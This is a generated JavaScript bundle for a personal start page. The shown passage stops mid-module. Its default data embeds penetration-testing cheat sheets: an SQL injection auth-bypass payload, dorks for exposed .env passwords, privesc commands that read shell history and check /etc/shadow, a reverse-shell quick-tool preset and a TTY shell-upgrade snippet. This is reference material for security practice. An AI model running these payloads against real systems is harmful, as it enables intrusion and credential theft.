/* WarMode bundle - GENERATED FILE, do not edit by hand.
 * Built from js/main.js + js/modules/*.js by tools/build_bundle.py so the
 * startpage runs from file:// where ES modules are blocked by CORS.
 * Edit the modules and re-run: python3 tools/build_bundle.py */
(function (global) {
  'use strict';
  var __modules = {};
  var __cache = {};
  function __def(name, factory) { __modules[name] = factory; }
  function __req(name) {
    if (__cache[name]) return __cache[name].exports;
    var mod = { exports: {} };
    __cache[name] = mod;
    __modules[name](mod, mod.exports, __req);
    return mod.exports;
  }

  __def("core", function (module, exports, __req) {
    "use strict";

/**
 * Core Utilities - Security, Storage, DOM Helpers
 */

function escapeHTML(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function normalizeUrl(raw) {
  const value = String(raw ?? '').trim();
  if (!value) return '';
  const withScheme = /^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(value) ? value : `https://${value}`;
  try {
    const url = new URL(withScheme);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return '#';
    return url.href;
  } catch {
    return '#';
  }
}

const FALLBACK_ICON = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%233fd9e8' stroke-width='2'%3E%3Ccircle cx='12' cy='12' r='9'/%3E%3Cpath d='M3.6 9h16.8M3.6 15h16.8M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18'/%3E%3C/svg%3E";

function safeHostname(url) {
  try { return new URL(normalizeUrl(url)).hostname; } catch { return 'example.com'; }
}

function safeLoadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    if (!raw) return JSON.parse(JSON.stringify(fallback));
    const parsed = JSON.parse(raw);
    if (Array.isArray(fallback) && !Array.isArray(parsed)) {
      return JSON.parse(JSON.stringify(fallback));
    }
    return parsed;
  } catch {
    return JSON.parse(JSON.stringify(fallback));
  }
}

function safeSaveJSON(key, data) {
  try {
    localStorage.setItem(key, JSON.stringify(data));
    return true;
  } catch (e) {
    console.error(`Failed to save ${key}:`, e);
    return false;
  }
}

function showToast(message) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = message;
  toast.classList.add('show');
  clearTimeout(window._toastTimer);
  window._toastTimer = setTimeout(() => toast.classList.remove('show'), 2200);
}

async function copyText(text, label = "Copied to clipboard") {
  const value = String(text ?? '');
  let ok = false;
  if (navigator.clipboard && window.isSecureContext) {
    try {
      await navigator.clipboard.writeText(value);
      ok = true;
    } catch (e) {
      ok = false;
    }
  }
  if (!ok) {
    const ta = document.createElement('textarea');
    ta.value = value;
    ta.setAttribute('readonly', '');
    ta.style.cssText = 'position:fixed;top:-1000px;left:-1000px;opacity:0;';
    document.body.appendChild(ta);
    ta.select();
    try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
    document.body.removeChild(ta);
  }
  showToast(ok ? `✔ ${label}` : `⚠ Copy failed — select manually`);
  return ok;
}

function $(selector, root = document) {
  return root.querySelector(selector);
}

function $$(selector, root = document) {
  return Array.from(root.querySelectorAll(selector));
}

/**
 * Create an element from a declarative attribute bag.
 *
 * Supports:
 *   - `className`, `textContent`, `innerHTML`, `value`, `title`, ...
 *     assigned as real DOM properties so labels actually render.
 *   - `style` as a string or an object of CSS declarations.
 *   - `dataset` as an object of data-* entries.
 *   - `on*` keys as event listeners.
 *   - boolean attributes (`disabled`, `checked`, `draggable`, ...) coerced.
 *   - `children` as strings/nodes appended after attributes.
 */
function createElement(tag, attrs = {}, children = []) {
  const el = document.createElement(tag);

  const BOOLEAN_ATTRS = new Set([
    'disabled', 'checked', 'selected', 'readonly', 'required', 'multiple',
    'autofocus', 'hidden', 'open', 'novalidate',
  ]);

  const PROPERTY_KEYS = new Set([
    'textContent', 'innerHTML', 'innerText', 'value', 'className', 'id',
    'title', 'htmlFor', 'tabIndex', 'draggable',
  ]);

  Object.entries(attrs).forEach(([key, value]) => {
    if (value === undefined || value === null || value === false) return;

    if (key.startsWith('on') && typeof value === 'function') {
      el.addEventListener(key.slice(2).toLowerCase(), value);
      return;
    }

    if (key === 'dataset') {
      Object.entries(value).forEach(([k, v]) => {
        el.dataset[k] = v == null ? '' : String(v);
      });
      return;
    }

    if (key === 'style') {
      if (typeof value === 'string') {
        el.style.cssText = value;
      } else {
        Object.entries(value).forEach(([prop, val]) => {
          if (val != null) el.style[prop] = String(val);
        });
      }
      return;
    }

    if (PROPERTY_KEYS.has(key)) {
      el[key] = value;
      return;
    }

    if (BOOLEAN_ATTRS.has(key)) {
      el.setAttribute(key, '');
      if (key in el) el[key] = true;
      return;
    }

    el.setAttribute(key, value === true ? '' : String(value));
  });

  children.forEach(child => {
    if (child === null || child === undefined || child === false) return;
    if (typeof child === 'string' || typeof child === 'number') {
      el.appendChild(document.createTextNode(String(child)));
    } else if (child instanceof Node) {
      el.appendChild(child);
    }
  });

  return el;
}

function dayKey(date = new Date()) {
  return date.toLocaleDateString('en-CA');
}

function debounce(fn, delay) {
  let timeoutId;
  return (...args) => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => fn(...args), delay);
  };
}

function throttle(fn, limit) {
  let inThrottle;
  return (...args) => {
    if (!inThrottle) {
      fn(...args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}
    exports["escapeHTML"] = escapeHTML;
    exports["normalizeUrl"] = normalizeUrl;
    exports["FALLBACK_ICON"] = FALLBACK_ICON;
    exports["safeHostname"] = safeHostname;
    exports["safeLoadJSON"] = safeLoadJSON;
    exports["safeSaveJSON"] = safeSaveJSON;
    exports["showToast"] = showToast;
    exports["copyText"] = copyText;
    exports["$"] = $;
    exports["$$"] = $$;
    exports["createElement"] = createElement;
    exports["dayKey"] = dayKey;
    exports["debounce"] = debounce;
    exports["throttle"] = throttle;
  });

  __def("storage", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var safeLoadJSON = core.safeLoadJSON;
    var safeSaveJSON = core.safeSaveJSON;

/**
 * Storage Module - Centralized data persistence
 */



const STORAGE_KEYS = {
  DOCK: 'traichu_dock',
  BOOKMARKS: 'traichu_bookmarks',
  GMAILS: 'traichu_gmails',
  CHEATS: 'traichu_cheats',
  QUICK_TOOLS: 'traichu_quick_tools',
  TODOS: 'traichu_todos',
  HABITS: 'traichu_habits',
  SNIPPETS: 'traichu_snippets',
  THEME: 'traichu_theme',
  HERO_GREET: 'traichu_hero_greet',
  HERO_SUB: 'traichu_hero_sub',
  PROMPT_USER: 'traichu_prompt_user',
  PROMPT_PATH: 'traichu_prompt_path',
  PROMPT_HASH: 'traichu_prompt_hash',
  SCRATCHPAD: 'traichu_scratchpad',
  FOCUS: 'traichu_focus',
  HABIT_DATE: 'traichu_habit_date',
  STREAK: 'traichu_streak',
  AUDIO_MODE: 'traichu_audio_mode',
};

const DEFAULTS = {
  DOCK: [
    { name: "Test App 1", url: "https://test.com", color: "var(--color-primary)" },
    { name: "Example Dev", url: "https://example.com", color: "var(--color-warning)" },
    { name: "GitHub", url: "https://github.com", color: "var(--color-success)" },
    { name: "MDN Docs", url: "https://developer.mozilla.org", color: "var(--color-primary)" }
  ],
  BOOKMARKS: [
    { title: "// DEV_&_CODE", links: [{ name: "Test Site", url: "https://test.com" }, { name: "Example Portal", url: "https://example.com" }, { name: "GitHub", url: "https://github.com" }, { name: "StackOverflow", url: "https://stackoverflow.com" }] },
    { title: "// CYBERSEC", links: [{ name: "Sec Lab Test", url: "https://test.com/lab" }, { name: "OWASP", url: "https://owasp.org" }, { name: "PortSwigger", url: "https://portswigger.net" }, { name: "Shodan", url: "https://www.shodan.io" }] },
    { title: "// DOCS_&_TOOLS", links: [{ name: "Docs Test", url: "https://test.com/docs" }, { name: "MDN Web Docs", url: "https://developer.mozilla.org" }, { name: "DevDocs", url: "https://devdocs.io" }, { name: "CyberChef", url: "https://gchq.github.io/CyberChef/" }] },
    { title: "// AI_&_MEDIA", links: [{ name: "AI Sandbox", url: "https://test.com/ai" }, { name: "ChatGPT", url: "https://chatgpt.com" }, { name: "Claude AI", url: "https://claude.ai" }, { name: "YouTube", url: "https://www.youtube.com" }] }
  ],
  GMAILS: [
    { name: "Primary Account", email: "user1@test.com", color: "#00897b", url: "" },
    { name: "Work Mailbox", email: "work@test.com", color: "#3949ab", url: "" },
    { name: "Security Lab", email: "admin@example.com", color: "#8e24aa", url: "" }
  ],
  CHEATS: {
    "dorks": "GOOGLE DORKS CHEAT-SHEET:\n• site:test.com -> Limit search to a site\n• intitle:\"index of\" -> Find open directories\n• filetype:pdf / ext:sql -> Find specific extensions\n• inurl:admin / inurl:login -> Find admin panels\n• cache:test.com -> View Google's cached version\n• intext:\"password\" ext:env -> Find exposed .env files",
    "sql": "SQLi & SQL CHEAT-SHEET:\n• ' OR 1=1-- -> Basic auth bypass\n• UNION SELECT null, user()-- -> Enum columns/data\n• SELECT * FROM t WHERE x=1 -> Read rows\n• JOIN t2 ON t.id=t2.id -> Combine tables\n• GROUP BY col HAVING COUNT(*)>1 -> Aggregate\n• ORDER BY col DESC LIMIT 10 -> Top rows",
    "linux": "LINUX / OFFSEC CHEAT-SHEET:\n• sudo -l -> Check sudo privileges\n• find / -perm -4000 2>/dev/null -> Find SUID binaries\n• crontab -l / cat /etc/crontab -> Check cron jobs\n• grep -rnw '/path' -e 'password' -> Search text deeply\n• ss -tulpn / netstat -tulpn -> Active listening ports\n• tar -czvf archive.tar.gz /folder -> Compress",
    "privesc": "LINUX PRIVESC CHECKLIST:\n• uname -a && cat /etc/os-release -> Kernel & OS\n• find / -writable -type d 2>/dev/null -> Writable dirs\n• getcap -r / 2>/dev/null -> File capabilities\n• cat ~/.bash_history -> Historical creds\n• ls -la /etc/passwd /etc/shadow -> File permissions\n• pspy64 -> Monitor processes without root",
    "nmap": "NMAP OFFSEC CHEAT-SHEET:\n• nmap -sC -sV -oA scan <ip> -> Default script & version\n• nmap -p- --min-rate 1000 <ip> -> Fast full port scan\n• nmap -sU --top-ports 100 <ip> -> Top UDP ports\n• nmap -Pn <ip> -> Skip host discovery (Ping block)",
    "git": "GIT CHEAT-SHEET:\n• git status -> Check changes\n• git add . && git commit -m 'msg' -> Stage & commit\n• git push origin main -> Push to remote repository\n• git log --oneline --graph -> Compact visual history\n• git reset --soft HEAD~1 -> Undo last commit, keep changes"
  },
  QUICK_TOOLS: [
    { label: "📋 Dorks", mode: "run", cmd: "cheat dorks" },
    { label: "💉 SQLi", mode: "run", cmd: "cheat sql" },
    { label: "🐧 Linux", mode: "run", cmd: "cheat linux" },
    { label: "🔓 PrivEsc", mode: "run", cmd: "cheat privesc" },
    { label: "🔍 Nmap", mode: "run", cmd: "cheat nmap" },
    { label: "🌿 Git", mode: "run", cmd: "cheat git" },
    { label: "🐚 RevShell", mode: "run", cmd: "rev 10.10.14.2 4444" },
    { label: "🔐 Base64", mode: "fill", cmd: "b64 " },
    { label: "🔑 JWT", mode: "fill", cmd: "jwt " },
    { label: "🛡️ Hash", mode: "fill", cmd: "hash " },
    { label: "🌐 CIDR", mode: "run", cmd: "cidr 10.10.14.0/24" },
    { label: "🎲 GenPass", mode: "run", cmd: "pass 20" },
    { label: "📡 My IP", mode: "run", cmd: "ip" },
    { label: "🎯 Mission", mode: "fill", cmd: "focus " }
  ],
  TODOS: [],
  HABITS: [
    { text: "Daily Coding / Problem Solving", done: false },
    { text: "1 Hr Security / Dev Lab", done: false },
    { text: "Deep Work Block (No Phone)", done: false }
  ],
  SNIPPETS: [
    { title: "TTY Shell Upgrade", code: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
    { title: "Fast Nmap All Ports", code: "nmap -p- --min-rate 1500 -sC -sV -oN scan.txt " },
    { title: "Local HTTP Server", code: "python3 -m http.server 8000" }
  ],
  THEME: 0,
  HERO_GREET: 'Welcome Operator!',
  HERO_SUB: 'Build things. Stay focused.',
  PROMPT_USER: 'user@warmode',
  PROMPT_PATH: '~',
  PROMPT_HASH: '$',
  SCRATCHPAD: '',
  FOCUS: '',
  HABIT_DATE: '',
  STREAK: 0,
  AUDIO_MODE: 0,
};

class Store {
  constructor() {
    this.data = {};
    this.subscribers = new Map();
    this.loadAll();
  }

  loadAll() {
    Object.entries(STORAGE_KEYS).forEach(([key, storageKey]) => {
      const defaultValue = DEFAULTS[key];
      this.data[key] = safeLoadJSON(storageKey, defaultValue);
    });
  }

  get(key) {
    return this.data[key];
  }

  set(key, value) {
    this.data[key] = value;
    const storageKey = STORAGE_KEYS[key];
    if (storageKey) {
      safeSaveJSON(storageKey, value);
    }
    this.notify(key, value);
  }

  subscribe(key, callback) {
    if (!this.subscribers.has(key)) {
      this.subscribers.set(key, new Set());
    }
    this.subscribers.get(key).add(callback);
    return () => this.unsubscribe(key, callback);
  }

  unsubscribe(key, callback) {
    this.subscribers.get(key)?.delete(callback);
  }

  notify(key, value) {
    this.subscribers.get(key)?.forEach(cb => cb(value));
  }

  resetAll() {
    Object.entries(DEFAULTS).forEach(([key, value]) => {
      this.set(key, JSON.parse(JSON.stringify(value)));
    });
  }

  exportAll() {
    const payload = {};
    Object.entries(STORAGE_KEYS).forEach(([key, storageKey]) => {
      payload[storageKey] = localStorage.getItem(storageKey);
    });
    return payload;
  }

  importAll(data) {
    Object.entries(data).forEach(([storageKey, value]) => {
      if (storageKey.startsWith('traichu_')) {
        localStorage.setItem(storageKey, value);
      }
    });
    this.loadAll();
    Object.keys(this.data).forEach(key => this.notify(key, this.data[key]));
  }

  /** Restore a single collection (DOCK/BOOKMARKS/GMAILS/CHEATS/QUICK_TOOLS) to defaults. */
  restoreDefaults(key) {
    if (!Object.prototype.hasOwnProperty.call(DEFAULTS, key)) return false;
    this.set(key, JSON.parse(JSON.stringify(DEFAULTS[key])));
    return true;
  }

  /** Restore every user-editable collection to its factory default. */
  restoreAllDefaults() {
    ['DOCK', 'BOOKMARKS', 'GMAILS', 'CHEATS', 'QUICK_TOOLS'].forEach(key => this.restoreDefaults(key));
  }
}

/**
 * Restore all factory defaults and notify subscribers so every panel re-renders.
 * Kept here (not in main.js) so both the UI and the command bar can call it
 * without creating a circular import through the entry point.
 */
function restoreDefaultSites() {
  store.restoreAllDefaults();
  if (typeof window.showToast === 'function') {
    window.showToast('✔ All Default Sites, Emails, Dock & Tools Restored!');
  }
}

const store = new Store();
    exports["restoreDefaultSites"] = restoreDefaultSites;
    exports["store"] = store;
    exports["STORAGE_KEYS"] = STORAGE_KEYS;
    exports["DEFAULTS"] = DEFAULTS;
  });

  __def("overlay", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var copyText = core.copyText;

/**
 * Overlay Module - Cheat overlay management
 */



let activeCheatKey = null;

function showOverlay(title, content, cheatKey = null) {
  const overlay = document.getElementById('cheat-overlay');
  const contentEl = document.getElementById('overlay-content');
  const titleEl = document.getElementById('overlay-title');
  const editBtn = document.getElementById('edit-cheat-btn');
  if (!overlay || !contentEl) return;

  closeOmniSuggestions();
  activeCheatKey = cheatKey;

  if (titleEl) titleEl.textContent = title;
  if (editBtn) editBtn.style.display = cheatKey ? 'inline-block' : 'none';
  contentEl.textContent = content == null ? '' : String(content);
  overlay.style.display = 'block';
}

function closeCheatOverlay() {
  const overlay = document.getElementById('cheat-overlay');
  if (overlay) overlay.style.display = 'none';
  activeCheatKey = null;
}

function copyOverlayText() {
  const contentEl = document.getElementById('overlay-content');
  const text = contentEl ? contentEl.textContent : '';
  if (text) copyText(text, "Output copied");
}

/**
 * Omni suggestion dropdown is owned by search.js. To avoid a circular import
 * (search -> overlay -> search) we delegate through the window bridge that
 * search.js installs at init time, falling back to a direct DOM hide.
 */
function closeOmniSuggestions() {
  if (typeof window.closeOmniSuggestions === 'function') {
    window.closeOmniSuggestions();
    return;
  }
  const box = document.getElementById('omni-suggestions');
  if (box) box.classList.remove('show');
}

function getActiveCheatKey() {
  return activeCheatKey;
}
    exports["showOverlay"] = showOverlay;
    exports["closeCheatOverlay"] = closeCheatOverlay;
    exports["copyOverlayText"] = copyOverlayText;
    exports["closeOmniSuggestions"] = closeOmniSuggestions;
    exports["getActiveCheatKey"] = getActiveCheatKey;
  });

  __def("shortcuts", function (module, exports, __req) {
    "use strict";

/**
 * Shortcuts Module - Keyboard shortcuts modal
 */

function toggleShortcutsModal() {
  const modal = document.getElementById('shortcuts-modal');
  if (modal) modal.classList.toggle('show');
}

function closeShortcutsModal() {
  const modal = document.getElementById('shortcuts-modal');
  if (modal) modal.classList.remove('show');
}
    exports["toggleShortcutsModal"] = toggleShortcutsModal;
    exports["closeShortcutsModal"] = closeShortcutsModal;
  });

  __def("zen", function (module, exports, __req) {
    "use strict";

/**
 * Zen Mode Module - Hide/show panels for distraction-free focus
 */

const ZEN_KEY = 'traichu_zen';

function isZenActive() {
  return document.body.classList.contains('zen-active');
}

function setZenMode(active, announce = true) {
  document.body.classList.toggle('zen-active', active);
  document.querySelectorAll('.zen-target').forEach(el => {
    el.classList.toggle('zen-hidden', active);
  });
  localStorage.setItem(ZEN_KEY, active ? '1' : '0');

  const btn = document.querySelector('#hint button[onclick*="toggleZenMode"]');
  if (btn) btn.setAttribute('aria-pressed', String(active));

  if (announce) {
    if (typeof window.showToast === 'function') {
      window.showToast(active ? '🧘 Zen Mode — clutter hidden' : 'Zen Mode off — panels restored');
    }
  }
}

function toggleZenMode() {
  setZenMode(!isZenActive());
}

function initZen() {
  const saved = localStorage.getItem(ZEN_KEY) === '1';
  if (saved) setZenMode(true, false);
}

    exports["setZenMode"] = setZenMode;
    exports["toggleZenMode"] = toggleZenMode;
    exports["initZen"] = initZen;
    exports["isZenActive"] = isZenActive;
  });

  __def("breathing", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var showToast = core.showToast;

/**
 * Breathing Module - Box breathing pacer (4-4-4-4)
 */



const PHASES = [
  { label: '🌬️ INHALE SLOWLY (4s)', scale: 1.1 },
  { label: '🧘 HOLD BREATH (4s)', scale: 1.1 },
  { label: '😮‍💨 EXHALE GENTLY (4s)', scale: 0.94 },
  { label: '✨ HOLD EMPTY (4s)', scale: 0.94 },
];

const PHASE_MS = 4000;
const TOTAL_PHASES = 16; // 4 rounds × 4 phases = 64s guided session

let breatheInterval = null;
let phaseIndex = 0;
let completedPhases = 0;

function setAnchor(anchor, text, scale) {
  if (!anchor) return;
  anchor.textContent = text;
  anchor.style.setProperty('--breathe-scale', String(scale));
}

function stopBreathing(anchor, announce = true) {
  if (breatheInterval) {
    clearInterval(breatheInterval);
    breatheInterval = null;
  }
  document.body.classList.remove('breathing');
  if (anchor) {
    anchor.classList.remove('active');
    anchor.textContent = '';
  }
  if (announce) showToast('Box Breathing Ended');
}

function toggleBreathing() {
  const anchor = document.getElementById('breathe-anchor');
  if (!anchor) return;

  if (breatheInterval) {
    stopBreathing(anchor);
    return;
  }

  phaseIndex = 0;
  completedPhases = 0;
  anchor.classList.add('active');
  document.body.classList.add('breathing');
  setAnchor(anchor, PHASES[0].label, PHASES[0].scale);

  breatheInterval = setInterval(() => {
    completedPhases += 1;

    if (completedPhases >= TOTAL_PHASES) {
      stopBreathing(anchor, false);
      showToast('✨ Box Breathing complete — 4 rounds. Notice how you feel.');
      return;
    }

    phaseIndex = (phaseIndex + 1) % PHASES.length;
    const phase = PHASES[phaseIndex];
    setAnchor(anchor, phase.label, phase.scale);
  }, PHASE_MS);

  showToast('Box Breathing Started (4-4-4-4 · 60s)');
}

function stopBreathingGuide() {
  stopBreathing(document.getElementById('breathe-anchor'), false);
}
    exports["toggleBreathing"] = toggleBreathing;
    exports["stopBreathingGuide"] = stopBreathingGuide;
  });

  __def("hero", function (module, exports, __req) {
    "use strict";

/**
 * Hero Module - Editable hero text + terminal prompt
 */

const DEFAULTS = {
  greet: 'Welcome Operator!',
  sub: 'Build things. Stay focused.',
  user: 'user@warmode',
  path: '~',
  hash: '$',
};

function setText(id, value) {
  const el = document.getElementById(id);
  if (el) el.innerText = value;
}

function getText(id, fallback) {
  const el = document.getElementById(id);
  const value = el ? el.innerText.trim() : '';
  return value || fallback;
}

function initHero() {
  loadHeroText();
}

function loadHeroText() {
  setText('greeting', localStorage.getItem('traichu_hero_greet') || DEFAULTS.greet);
  setText('subline-text', localStorage.getItem('traichu_hero_sub') || DEFAULTS.sub);
  setText('prompt-user', localStorage.getItem('traichu_prompt_user') || DEFAULTS.user);
  setText('prompt-path', localStorage.getItem('traichu_prompt_path') || DEFAULTS.path);
  setText('prompt-hash', localStorage.getItem('traichu_prompt_hash') || DEFAULTS.hash);
}

function saveHeroText() {
  localStorage.setItem('traichu_hero_greet', getText('greeting', DEFAULTS.greet));
  localStorage.setItem('traichu_hero_sub', getText('subline-text', DEFAULTS.sub));
  localStorage.setItem('traichu_prompt_user', getText('prompt-user', DEFAULTS.user));
  localStorage.setItem('traichu_prompt_path', getText('prompt-path', DEFAULTS.path));
  localStorage.setItem('traichu_prompt_hash', getText('prompt-hash', DEFAULTS.hash));

  // Keep the on-screen text in sync with what was actually persisted.
  setText('greeting', localStorage.getItem('traichu_hero_greet'));
  setText('subline-text', localStorage.getItem('traichu_hero_sub'));
}
    exports["initHero"] = initHero;
    exports["saveHeroText"] = saveHeroText;
  });

  __def("focus", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var showToast = core.showToast;

/**
 * Focus Module - Mission focus anchor
 */




function setFocus(text) {
  const value = String(text ?? '').trim();
  if (!value) {
    showToast('Enter a mission to focus on');
    return;
  }
  store.set('FOCUS', value);
  renderFocus();
  showToast('🎯 Mission Locked');
}

function clearFocus() {
  store.set('FOCUS', '');
  renderFocus();
  const q = document.getElementById('q');
  if (q) q.focus();
  showToast('Mission Cleared');
}

function renderFocus() {
  const f = store.get('FOCUS');
  const el = document.getElementById('focus-anchor');
  if (!el) return;
  if (f) {
    el.innerText = `🎯 CURRENT MISSION: ${f}`;
    el.classList.add('active');
  } else {
    el.innerText = '';
    el.classList.remove('active');
  }
}
    exports["setFocus"] = setFocus;
    exports["clearFocus"] = clearFocus;
    exports["renderFocus"] = renderFocus;
  });

  __def("audio", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var showToast = core.showToast;

/**
 * Audio Module - Focus soundscapes synthesised with the Web Audio API.
 *
 * Browsers block AudioContext playback until a user gesture, so the saved
 * mode is restored to the *badge* only; audio actually starts on the first
 * explicit user action (cycleAudio / clicking the badge).
 */



const STORAGE_KEY = 'traichu_audio_mode';
const AUDIO_MODES = ['Off', 'Brown Noise', 'Pink Rain', '40Hz Gamma'];

let audioCtx = null;
let activeAudioNodes = [];
let audioModeIndex = 0;

function getAudioContext() {
  const Ctor = window.AudioContext || window.webkitAudioContext;
  if (!Ctor) return null;
  if (!audioCtx) {
    try {
      audioCtx = new Ctor();
    } catch (e) {
      return null;
    }
  }
  if (audioCtx.state === 'suspended') {
    audioCtx.resume().catch(() => {});
  }
  return audioCtx;
}

function initAudio() {
  const saved = parseInt(localStorage.getItem(STORAGE_KEY), 10);
  audioModeIndex = Number.isFinite(saved) && saved >= 0 && saved < AUDIO_MODES.length ? saved : 0;
  updateAudioBadge();
}

function stopFocusAudio() {
  activeAudioNodes.forEach(n => {
    try { if (typeof n.stop === 'function') n.stop(); } catch (e) {}
    try { if (typeof n.disconnect === 'function') n.disconnect(); } catch (e) {}
  });
  activeAudioNodes = [];
}

function buildNoiseBuffer(ctx, modeIdx) {
  const bufferSize = 2 * ctx.sampleRate;
  const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
  const output = noiseBuffer.getChannelData(0);

  if (modeIdx === 1) {
    // Brown noise: integrated white noise, normalised.
    let lastOut = 0.0;
    for (let i = 0; i < bufferSize; i++) {
      const white = Math.random() * 2 - 1;
      output[i] = (lastOut + (0.02 * white)) / 1.02;
      lastOut = output[i];
      output[i] *= 3.2;
    }
  } else {
    // Pink noise (Paul Kellet's refined method).
    let b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0, b6 = 0;
    for (let i = 0; i < bufferSize; i++) {
      const white = Math.random() * 2 - 1;
      b0 = 0.99886 * b0 + white * 0.0555179;
      b1 = 0.99332 * b1 + white * 0.0750759;
      b2 = 0.96900 * b2 + white * 0.1538520;
      b3 = 0.86650 * b3 + white * 0.3104856;
      b4 = 0.55000 * b4 + white * 0.5329522;
      b5 = -0.7616 * b5 - white * 0.0168980;
      output[i] = (b0 + b1 + b2 + b3 + b4 + b5 + b6 + white * 0.5362) * 0.04;
      b6 = white * 0.115926;
    }
  }
  return noiseBuffer;
}

function startFocusAudio(modeIdx) {
  stopFocusAudio();
  if (modeIdx === 0) return;

  const ctx = getAudioContext();
  if (!ctx) {
    showToast('Web Audio unavailable in this browser');
    return;
  }

  const masterGain = ctx.createGain();
  masterGain.gain.value = 0.14;
  masterGain.connect(ctx.destination);
  activeAudioNodes.push(masterGain);

  if (modeIdx === 1 || modeIdx === 2) {
    const src = ctx.createBufferSource();
    src.buffer = buildNoiseBuffer(ctx, modeIdx);
    src.loop = true;

    const filter = ctx.createBiquadFilter();
    filter.type = 'lowpass';
    filter.frequency.value = modeIdx === 1 ? 420 : 1200;

    src.connect(filter);
    filter.connect(masterGain);
    src.start(0);
    activeAudioNodes.push(src, filter);
  } else if (modeIdx === 3) {
    // 40Hz gamma binaural: 200Hz left, 240Hz right → 40Hz beat.
    const merger = ctx.createChannelMerger(2);
    const oscL = ctx.createOscillator();
    const oscR = ctx.createOscillator();
    oscL.type = 'sine';
    oscR.type = 'sine';
    oscL.frequency.value = 200;
    oscR.frequency.value = 240;

    const gainL = ctx.createGain();
    const gainR = ctx.createGain();
    gainL.gain.value = 0.5;
    gainR.gain.value = 0.5;

    oscL.connect(gainL);
    gainL.connect(merger, 0, 0);
    oscR.connect(gainR);
    gainR.connect(merger, 0, 1);
    merger.connect(masterGain);
    oscL.start();
    oscR.start();
    activeAudioNodes.push(oscL, oscR, gainL, gainR, merger);
  }
}

function cycleAudio() {
  audioModeIndex = (audioModeIndex + 1) % AUDIO_MODES.length;
  localStorage.setItem(STORAGE_KEY, String(audioModeIndex));
  startFocusAudio(audioModeIndex);
  updateAudioBadge();
  showToast(`Focus Audio: ${AUDIO_MODES[audioModeIndex]}`);
}

function updateAudioBadge() {
  const badge = document.getElementById('audio-status');
  if (!badge) return;
  badge.innerHTML = `🎧 ${AUDIO_MODES[audioModeIndex]} <kbd>⌥A</kbd>`;
  badge.classList.toggle('playing', audioModeIndex !== 0);
  badge.setAttribute('aria-pressed', String(audioModeIndex !== 0));
}

function stopAudio() {
  stopFocusAudio();
}

function getAudioModeIndex() {
  return audioModeIndex;
}

    exports["initAudio"] = initAudio;
    exports["startFocusAudio"] = startFocusAudio;
    exports["cycleAudio"] = cycleAudio;
    exports["stopAudio"] = stopAudio;
    exports["getAudioModeIndex"] = getAudioModeIndex;
    exports["AUDIO_MODES"] = AUDIO_MODES;
  });

  __def("theme", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var showToast = core.showToast;

/**
 * Theme Module - Curated dark palette system + light/dark mode toggle
 *
 * Architecture:
 *   - `DARK_THEMES` is an ordered list of premium dark palettes. The numeric
 *     index persisted in `traichu_theme` is the position in this list.
 *   - `LIGHT_THEME` is applied when Dark Mode is switched off. It is NOT part
 *     of the cycle: cycling always lands back on a dark palette.
 *   - `traichu_theme_id` stores the resolved theme id so the inline pre-paint
 *     bootstrap in index.html can apply the palette before first paint
 *     (prevents a flash of the default theme).
 *   - All color values live in css/themes.css; this module only owns ids,
 *     names, ordering, and mode state.
 */




/** Premium dark palettes, in cycle order. */
const DARK_THEMES = [
  { name: 'Agni', id: 'agni' },
  { name: 'Sagar', id: 'sagar' },
  { name: 'Van', id: 'van' },
  { name: 'Akasha', id: 'akasha' },
  { name: 'Himadri', id: 'himadri' },
  { name: 'Aranya', id: 'aranya' },
  { name: 'Calm Dark', id: 'calm' },
  { name: 'HackTheBox', id: 'htb' },
  { name: 'Catppuccin', id: 'catppuccin' },
  { name: 'GitHub', id: 'github' },
  { name: 'VS Code', id: 'vscode' },
  { name: 'Nord', id: 'nord' },
  { name: 'Claude', id: 'claude' },
  { name: 'ChatGPT', id: 'chatgpt' },
  { name: 'Atom', id: 'atom' },
  { name: 'Athena OS', id: 'athena' },
  { name: 'Kali Linux', id: 'kali' },
];

/** Applied when Dark Mode is off. Deliberately excluded from the cycle. */
const LIGHT_THEME = { name: 'Daylight', id: 'daylight' };

const THEME_INDEX_KEY = 'traichu_theme';
const THEME_ID_KEY = 'traichu_theme_id';
const DARK_MODE_KEY = 'traichu_dark';

/** All selectable themes, exposed for UIs that list them. */
const THEMES = [...DARK_THEMES, LIGHT_THEME];

function getThemeIndex() {
  const raw = parseInt(localStorage.getItem(THEME_INDEX_KEY), 10);
  if (!Number.isFinite(raw)) return 0;
  return ((raw % DARK_THEMES.length) + DARK_THEMES.length) % DARK_THEMES.length;
}

/** Dark Mode is on unless the user explicitly stored '0'. */
function isDarkMode() {
  return localStorage.getItem(DARK_MODE_KEY) !== '0';
}

function persist(themeId, index, dark) {
  localStorage.setItem(THEME_ID_KEY, themeId);
  localStorage.setItem(THEME_INDEX_KEY, String(index));
  localStorage.setItem(DARK_MODE_KEY, dark ? '1' : '0');
}

function paint(themeId, displayName) {
  const dark = isDarkMode();
  document.documentElement.dataset.theme = themeId;
  document.documentElement.classList.toggle('light-mode', !dark);

  const k = document.getElementById('theme-name');
  if (k) k.textContent = displayName;

  const toggle = document.getElementById('dark-mode-toggle');
  if (toggle) {
    toggle.setAttribute('aria-checked', String(dark));
    toggle.classList.toggle('is-dark', dark);
